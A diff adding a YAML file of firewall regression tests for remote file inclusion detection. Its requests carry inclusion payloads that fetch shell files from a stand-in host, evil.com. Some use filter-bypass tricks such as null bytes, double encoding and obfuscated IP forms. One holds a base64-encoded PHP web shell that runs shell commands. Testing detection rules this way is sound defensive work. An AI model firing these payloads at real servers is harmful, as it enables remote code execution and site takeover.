@@ -1,0 +1,285 @@
+---
+meta:
+  author: "Security Engineer"
+  description: "Comprehensive RFI payload testing"
+  enabled: true
+  name: "931-rfi.yaml"
+tests:
+  - test_id: 931100
+    desc: "Basic RFI HTTP"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/page?file=http://evil.com/shell.txt"
+          output:
+            log_contains: "http://evil.com"
+  - test_id: 931101
+    desc: "Basic RFI HTTPS"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/page?file=https://evil.com/shell.txt"
+          output:
+            log_contains: "https://evil.com"
+  - test_id: 931102
+    desc: "FTP protocol RFI"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=ftp://evil.com/shell"
+          output:
+            log_contains: "ftp://"
+  - test_id: 931103
+    desc: "Data URI RFI"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4="
+          output:
+            log_contains: "data://"
+  - test_id: 931104
+    desc: "PHP expect wrapper RFI"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=expect://id"
+          output:
+            log_contains: "expect://"
+  - test_id: 931105
+    desc: "Null byte RFI"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://evil.com/shell.php%00"
+          output:
+            log_contains: "%00"
+  - test_id: 931106
+    desc: "Double encoding RFI"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http%253A%252F%252Fevil.com%252Fshell.txt"
+          output:
+            log_contains: "http%253A"
+  - test_id: 931107
+    desc: "RFI via parameter pollution"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=safe.txt&path=http://evil.com/shell.txt"
+          output:
+            log_contains: "evil.com"
+  - test_id: 931108
+    desc: "SMB path inclusion"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=\\\\evil.com\\share\\shell.txt"
+          output:
+            log_contains: "\\\\evil.com"
+  - test_id: 931109
+    desc: "RFI with port specification"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://evil.com:8080/shell.txt"
+          output:
+            log_contains: "8080"
+  - test_id: 931110
+    desc: "RFI with basic auth"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://admin:admin@evil.com/shell.txt"
+          output:
+            log_contains: "admin:admin"
+  - test_id: 931111
+    desc: "RFI bypass appending question mark"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://evil.com/shell.php?"
+          output:
+            log_contains: "shell.php?"
+  - test_id: 931112
+    desc: "RFI bypass appending fragment"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://evil.com/shell.php#"
+          output:
+            log_contains: "shell.php#"
+  - test_id: 931113
+    desc: "RFI with IP address"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://192.168.1.100/shell.txt"
+          output:
+            log_contains: "192.168"
+  - test_id: 931114
+    desc: "RFI with decimal IP address"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://3232235876/shell.txt"
+          output:
+            log_contains: "3232235876"
+  - test_id: 931115
+    desc: "RFI with octal IP address"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://0300.0250.0001.0144/shell.txt"
+          output:
+            log_contains: "0300"
+  - test_id: 931116
+    desc: "RFI with hex IP address"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/load?path=http://0xc0.0xa8.0x01.0x64/shell.txt"
+          output:
+            log_contains: "0xc0"
+  - test_id: 931117
+    desc: "RFI POST body"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/load"
+            data: "path=http://evil.com/shell.txt"
+          output:
+            log_contains: "http://evil.com"
+  - test_id: 931118
+    desc: "RFI in User-Agent header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "http://evil.com/shell.txt"
+              Host: "localhost"
+            uri: "/load"
+          output:
+            log_contains: "http://evil.com"
+  - test_id: 931119
+    desc: "RFI in Cookie header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Cookie: "session_file=http://evil.com/shell.txt"
+              Host: "localhost"
+            uri: "/load"
+          output:
+            log_contains: "http://evil.com"
+  - test_id: 931120
+    desc: "RFI in Referer header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Referer: "http://evil.com/shell.txt"
+              Host: "localhost"
+            uri: "/load"
+          output:
+            log_contains: "http://evil.com"
